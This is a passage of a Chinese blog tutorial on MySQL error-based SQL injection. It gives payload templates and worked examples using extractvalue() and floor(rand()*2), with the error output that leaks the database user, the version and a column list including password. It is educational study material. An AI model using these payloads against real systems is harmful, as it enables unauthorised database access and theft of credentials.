+<h4 id="Payload-构造-1"><a href="#Payload-构造-1" class="headerlink" title="Payload 构造"></a><strong>Payload 构造</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x7e</span>, (查询语句), <span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure>
+<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a><strong>示例</strong></h4><ul>
+<li><p><strong>获取当前用户</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and extractvalue(1, concat(0x7e, user(), 0x7e)) --+</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>报错信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~root@localhost~&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p><strong>获取字段名</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;), 0x7e)) --+</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>报错信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~id,username,password~&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="与-updatexml-的区别"><a href="#与-updatexml-的区别" class="headerlink" title="与 updatexml() 的区别"></a><strong>与 <code>updatexml()</code> 的区别</strong></h4><ul>
+<li><strong>参数数量</strong>：<code>extractvalue()</code> 只需两个参数，<code>updatexml()</code> 需要三个。</li>
+<li><strong>错误信息位置</strong>：<code>extractvalue()</code> 的报错信息通常更简洁，适合快速提取数据。</li>
+</ul>
+<hr>
+<h3 id="floor-rand-2-重复值冲突报错"><a href="#floor-rand-2-重复值冲突报错" class="headerlink" title="floor(rand()\*2) 重复值冲突报错"></a><strong><code>floor(rand()\*2)</code> 重复值冲突报错</strong></h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a><strong>原理</strong></h4><ul>
+<li><p><strong>核心逻辑</strong>：利用 <code>floor(rand()*2)</code> 在 <code>group by</code> 子句中的随机性，导致主键重复冲突。</p>
+</li>
+<li><p>关键步骤</p>
+<ol>
+<li><code>floor(rand()*2)</code> 生成 0 或 1 的随机数。</li>
+</ol>
+</li>
+</ul>
+<ol>
+<li>在聚合查询（如 <code>count()</code>）中，由于 <code>rand()</code> 的重复计算，可能生成重复的临时键值，触发 <code>Duplicate entry</code> 错误。</li>
+</ol>
+<h4 id="Payload-构造-2"><a href="#Payload-构造-2" class="headerlink" title="Payload 构造"></a><strong>Payload 构造</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>), concat(<span class="number">0x7e</span>, (查询语句), <span class="number">0x7e</span>, <span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>)) <span class="keyword">as</span> x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x) <span class="keyword">as</span> a)</span><br></pre></td></tr></table></figure>
+<h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a><strong>示例</strong></h4><ul>
+<li><p><strong>获取数据库版本</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*), concat(0x7e, version(), 0x7e, floor(rand()*2)) as x from information_schema.tables group by x) as a) --+</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>报错信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Duplicate entry &#x27;~5.7.36~1&#x27; for key &#x27;group_key&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p><strong>获取表名</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*), concat(0x7e, (select table_name from information_schema.tables where table_schema=database() limit 1), 0x7e, floor(rand()*2)) as x from information_schema.tables group by x) as a) --+</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a><strong>注意事项</strong></h4><ul>
+<li><strong>随机性要求</strong>：可能需要多次执行才能触发报错。</li>
+<li><strong>结果长度限制</strong>：同样受 64 字节限制，需分段截取。</li>
+<li><strong>适用场景</strong>：适用于无 <code>updatexml()</code> 和 <code>extractvalue()</code> 权限的环境。</li>
+</ul>
+<hr>
+<h3 id="三种方法的对比总结"><a href="#三种方法的对比总结" class="headerlink" title="三种方法的对比总结"></a><strong>三种方法的对比总结</strong></h3><div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><strong>方法</strong></th>
+<th style="text-align:left">优点</th>
+<th style="text-align:left">缺点</th>
+<th style="text-align:left">适用场景</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><code>updatexml()</code></td>
+<td style="text-align:left">直接快速，错误信息清晰</td>
+<td style="text-align:left">结果长度受限</td>
+<td style="text-align:left">快速提取短数据</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>extractvalue()</code></td>
+<td style="text-align:left">参数简单，错误信息简洁</td>
+<td style="text-align:left">同 <code>updatexml()</code></td>
+<td style="text-align:left">同 <code>updatexml()</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><code>floor(rand()*2)</code></td>
+<td style="text-align:left">不依赖 XML 函数权限</td>
+<td style="text-align:left">需多次尝试，构造复杂</td>
+<td style="text-align:left">无 XML 函数权限的环境</td>
+</tr>
+</tbody>
+</table>
+</div>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://flyfish567.github.io">FLYFISH</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://flyfish567.github.io/posts/bf58a956.html">https://flyfish567.github.io/posts/bf58a956.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://flyfish567.github.io" target="_blank">FLYFISH</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></div><div class="post-share"><div class="social-share" data-image="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img微信图片_20250225164409.bmp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/f829d9e.html" title="SQL注入其他问题"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img683ddc3754e6a5fcd482d89047dcf37c395143382.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">SQL注入其他问题</div></div><div class="info-2"><div class="info-item-1">id=-1 和id= 1 的区别两种场景的本质区别     场景 id=-1 + UNION id=1 + ORDER BY     目标 显示 UNION 后的自定义数据 探测原查询的列数   原查询是否需要结果 不需要（需返回空） 需要（确保 ORDER BY 能执行）   核心逻辑 绕过原数据，强制显示注入结果 利用错误或页面变化推断列数   数值选择 用不存在的值（如 -1） 用存在的值（如 1）     SQL注入语句注释在 Sql 注入中，需要使用 Mysql 的注释符号，需要去注释注入语句后面的语句不被执行，Mysql中单行注释有两种方式，分别是#和— (—后面有空格) 但是，需要注意的是，在url中，如果是get请求，解释执行的时候，url中#号是用来指导浏览器动作的，对服务器端无用。所以，HTTP请求中使用 get 传参时不包括#，因为使用 # 闭合无法注释，会报错；而使用— （有个空格），在传输过程中空格会被忽略，同样导致无法注释，所以在get请求传参注入时才会使用 —+ 的方式来闭合，因为+会被解释成空格。 注释符号的差异与使用场景(1) #...</div></div></div></a><a class="pagination-related" href="/posts/5e22ae9e.html" title="SQL联合查询"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img微信图片_20250225164214.bmp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">SQL联合查询</div></div><div class="info-2"><div class="info-item-1"> SQL注入分类：  回显正常—-&gt; 联合查询union select  回显报错—&gt;报错注入：     1. `extractvalue()` 2. `updatexml()` 3. `floor(rand()\*2)`  盲注： 布尔盲注 时间盲注   </div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/f829d9e.html" title="SQL注入其他问题"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img683ddc3754e6a5fcd482d89047dcf37c395143382.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-01</div><div class="info-item-2">SQL注入其他问题</div></div><div class="info-2"><div class="info-item-1">id=-1 和id= 1 的区别两种场景的本质区别     场景 id=-1 + UNION id=1 + ORDER BY     目标 显示 UNION 后的自定义数据 探测原查询的列数   原查询是否需要结果 不需要（需返回空） 需要（确保 ORDER BY 能执行）   核心逻辑 绕过原数据，强制显示注入结果 利用错误或页面变化推断列数   数值选择 用不存在的值（如 -1） 用存在的值（如 1）     SQL注入语句注释在 Sql 注入中，需要使用 Mysql 的注释符号，需要去注释注入语句后面的语句不被执行，Mysql中单行注释有两种方式，分别是#和— (—后面有空格) 但是，需要注意的是，在url中，如果是get请求，解释执行的时候，url中#号是用来指导浏览器动作的，对服务器端无用。所以，HTTP请求中使用 get 传参时不包括#，因为使用 # 闭合无法注释，会报错；而使用— （有个空格），在传输过程中空格会被忽略，同样导致无法注释，所以在get请求传参注入时才会使用 —+ 的方式来闭合，因为+会被解释成空格。 注释符号的差异与使用场景(1) #...</div></div></div></a><a class="pagination-related" href="/posts/9ba791c1.html" title="SQL注入原理"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img微信图片_20250225164340.bmp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-25</div><div class="info-item-2">SQL注入原理</div></div><div class="info-2"><div class="info-item-1">SQL注入概念及产生原因：​    当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。 2.SQL注入的本质：把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则 3.SQL注入的两个关键点：1，用户能控制输入的内容； 2，web应用把用户输入的内容带入到数据库执行；SQL注入基础危害：）盗取网站的敏感信息;）绕过网站后台认证 后台登录语句： SELECT * FROM admin WHERE Username=‘user’ and Password=‘pass’ 万能密码：‘or ’1‘ = ’1‘ # ;）借助SQL注入漏洞提权获取系统权限;）读取文件信息。MYSQL数据库注入-常用函数：（1）user() 返回当前使用数据库的用户，也就是网站配置文件中连接数据库的账号 （2）version() 返回当前数据库的版本 （3）database() 返回当前使用的数据库，只有在use命令选择一个数据库之后，才能查到...</div></div></div></a><a class="pagination-related" href="/posts/7ba791c1.html" title="SQL注入思路"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img00eb9d9de849c996d4cdb440fb732bdb395143382.jpg@1192w.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-25</div><div class="info-item-2">SQL注入思路</div></div><div class="info-2"><div class="info-item-1"> SQL注入分类：  回显正常—-&gt; 联合查询union select  回显报错—&gt;报错注入：      1. `extractvalue()`  2. `updatexml()`  3....</div></div></div></a><a class="pagination-related" href="/posts/5e22ae9e.html" title="SQL联合查询"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img微信图片_20250225164214.bmp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-01</div><div class="info-item-2">SQL联合查询</div></div><div class="info-2"><div class="info-item-1"> SQL注入分类：  回显正常—-&gt; 联合查询union select  回显报错—&gt;报错注入：     1. `extractvalue()` 2. `updatexml()` 3. `floor(rand()\*2)`  盲注： 布尔盲注 时间盲注   </div></div></div></a><a class="pagination-related" href="/posts/179744d1.html" title="SQL盲注"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img683ddc3754e6a5fcd482d89047dcf37c395143382.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-03</div><div class="info-item-2">SQL盲注</div></div><div class="info-2"><div class="info-item-1">SQL注入分类：  回显正常—-&gt; 联合查询union select  回显报错—&gt;报错注入：    extractvalue() updatexml() floor(rand()\*2)   盲注： 布尔盲注 时间盲注   SQL盲注概述原理 核心问题：应用程序存在SQL注入漏洞，但无法直接返回查询结果或错误信息（如页面无数据回显）。 攻击逻辑：通过构造条件语句，观察页面的 布尔状态（True/False） 或 时间延迟（Time Delay），间接推断数据库信息（如字段值、表名、数据库版本）。  适用场景 布尔盲注：页面响应有明显差异（如内容存在/消失、HTTP状态码变化）。 时间盲注：页面响应无差异，但可通过注入时间函数触发延迟（如SLEEP(5)）。   布尔盲注（Boolean-Based Blind SQL Injection）原理与特点 原理：通过构造布尔条件（如AND 1=1或AND...</div></div></div></a><a class="pagination-related" href="/posts/9b13a55.html" title="SQL注入总结"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img微信图片_20250225164357.bmp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-01</div><div class="info-item-2">SQL注入总结</div></div><div class="info-2"><div class="info-item-1">SQL注入原理 SQL注入思路 如何判断SQL注入闭合 SQL注入方式：  联合查询 报错注入 布尔盲注  其他问题： SQL注入语句闭合方式 </div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">FLYFISH</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/FLYFISH567"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">三玖天下第一！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88Error-Based-Injection%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">报错注入（Error-Based Injection）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">核心原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#updatexml-%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">updatexml() 函数报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload-%E6%9E%84%E9%80%A0"><span class="toc-number">1.2.2.</span> <span class="toc-text">Payload 构造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.2.3.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">1.2.4.</span> <span class="toc-text">注意事项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#concat-%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.5.</span> <span class="toc-text">concat()函数 </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#substr-%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.6.</span> <span class="toc-text">substr()函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#extractvalue-%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">extractvalue() 函数报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload-%E6%9E%84%E9%80%A0-1"><span class="toc-number">1.3.2.</span> <span class="toc-text">Payload 构造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-1"><span class="toc-number">1.3.3.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8E-updatexml-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.3.4.</span> <span class="toc-text">与 updatexml() 的区别</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#floor-rand-2-%E9%87%8D%E5%A4%8D%E5%80%BC%E5%86%B2%E7%AA%81%E6%8A%A5%E9%94%99"><span class="toc-number">1.4.</span> <span class="toc-text">floor(rand()\*2) 重复值冲突报错</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">1.4.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload-%E6%9E%84%E9%80%A0-2"><span class="toc-number">1.4.2.</span> <span class="toc-text">Payload 构造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-2"><span class="toc-number">1.4.3.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-1"><span class="toc-number">1.4.4.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95%E7%9A%84%E5%AF%B9%E6%AF%94%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text">三种方法的对比总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/179744d1.html" title="SQL盲注"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img683ddc3754e6a5fcd482d89047dcf37c395143382.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL盲注"/></a><div class="content"><a class="title" href="/posts/179744d1.html" title="SQL盲注">SQL盲注</a><time datetime="2025-03-03T04:05:27.586Z" title="发表于 2025-03-03 12:05:27">2025-03-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/4d669f08.html" title="SQL注入之一句话木马"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img微信图片_20250225164357.bmp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入之一句话木马"/></a><div class="content"><a class="title" href="/posts/4d669f08.html" title="SQL注入之一句话木马">SQL注入之一句话木马</a><time datetime="2025-03-02T14:16:06.373Z" title="发表于 2025-03-02 22:16:06">2025-03-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/dcac73d5.html" title="CTF工具安装整理"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img微信图片_20250225164405.bmp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF工具安装整理"/></a><div class="content"><a class="title" href="/posts/dcac73d5.html" title="CTF工具安装整理">CTF工具安装整理</a><time datetime="2025-03-01T16:28:48.139Z" title="发表于 2025-03-02 00:28:48">2025-03-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/5e22ae9e.html" title="SQL联合查询"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img微信图片_20250225164214.bmp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL联合查询"/></a><div class="content"><a class="title" href="/posts/5e22ae9e.html" title="SQL联合查询">SQL联合查询</a><time datetime="2025-03-01T10:26:51.870Z" title="发表于 2025-03-01 18:26:51">2025-03-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/bf58a956.html" title="SQL报错注入"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.img微信图片_20250225164409.bmp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL报错注入"/></a><div class="content"><a class="title" href="/posts/bf58a956.html" title="SQL报错注入">SQL报错注入</a><time datetime="2025-03-01T09:19:01.561Z" title="发表于 2025-03-01 17:19:01">2025-03-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2025 By FLYFISH</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.3</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="12908278323" data-server="netease" data-type="playlist"   data-order="list" data-fixed="true" data-preload="auto" data-autoplay="false" data-mutex="true" ></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      window.location.href = e.request.responseURL
+    }
+  })
+})()</script><div class="app-refresh" id="app-refresh" style="position: fixed;top: -2.2rem;left: 0;right: 0;z-index: 99999;padding: 0 1rem;font-size: 15px;height: 2.2rem;transition: all 0.3s ease;"><div class="app-refresh-wrap" style=" display: flex;color: #fff;height: 100%;align-items: center;justify-content: center;"><label>✨ 有新文章啦！ 👉</label><a href="javascript:void(0)" onclick="location.reload()"><span style="color: #fff;text-decoration: underline;cursor: pointer;">🍗点击食用🍔</span></a></div></div><script>if ('serviceWorker' in navigator) {
+if (navigator.serviceWorker.controller) {
+navigator.serviceWorker.addEventListener('controllerchange', function() {
+showNotification()
+})
+}
+window.addEventListener('load', function() {
+navigator.serviceWorker.register('/sw.js')
+})
+}
+function showNotification() {
